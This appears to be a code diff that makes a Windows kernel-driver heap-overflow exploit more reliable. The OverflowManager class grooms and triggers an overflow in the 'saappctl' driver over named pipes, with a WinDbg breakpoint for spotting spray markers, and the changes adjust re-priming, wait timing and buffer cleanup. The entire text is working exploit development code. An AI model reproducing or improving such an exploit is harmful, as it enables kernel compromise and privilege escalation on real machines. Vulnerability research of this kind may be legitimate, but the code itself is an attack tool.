@@ -1,5 +1,7 @@
 #include "general.h"
 
+#define OVERFLOW_IRP_WAIT_MS 20
+
 //bp saappctl+0x02F454".if (qwo(@rbx + 4) == 0x6161616161616161) { dc rbx-4 L 50} .else { gc }"
 
 OverflowManager::OverflowManager(HANDLE hDevice)
@@ -15,8 +17,10 @@ void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
 	DEBUG_PRINT(" [*] Priming overflow with chunk size: 0x%llx\n", tChunkSize);
     if (overflowPrimed)
     {
-        DEBUG_PRINT(" [!] Overflow already primed!\n");
-        return;
+        // If a previous prime path is still active, gracefully flush and reset
+        // before attempting to re-prime. This avoids stale state across refresh
+        // cycles which was causing instability and long retries.
+        PassOverflow();
     }
 
     chunkSize = tChunkSize;
@@ -48,7 +52,7 @@ void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
 
     if (irpReadyEvent && irpFailedEvent) {
         HANDLE waitHandles[] = { irpReadyEvent, irpFailedEvent };
-        DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, 2000);
+        DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, OVERFLOW_IRP_WAIT_MS);
         if (waitResult == WAIT_OBJECT_0 + 1) {
             DEBUG_PRINT(" [!] Overflow IRP worker failed to open pipe handle\n");
             DisconnectNamedPipe(sPipe);
@@ -105,6 +109,7 @@ void OverflowManager::PassOverflow()
 
     if (WriteFile(sPipe, payload, totalPayloadSize, &bytesWritten, NULL))
         FlushFileBuffers(sPipe);
+    delete[] payload;
 
     DisconnectNamedPipe(sPipe);
 
@@ -141,6 +146,7 @@ void OverflowManager::TriggerOverflow(BYTE* overflowData, UINT64 overflowSize)
 	DEBUG_PRINT(" [*] Sending 0x%llx bytes of payload to driver...\n", totalPayloadSize);
     if (WriteFile(sPipe, payload, totalPayloadSize, &bytesWritten, NULL))
         FlushFileBuffers(sPipe);
+    delete[] payload;
 
     DisconnectNamedPipe(sPipe);
 
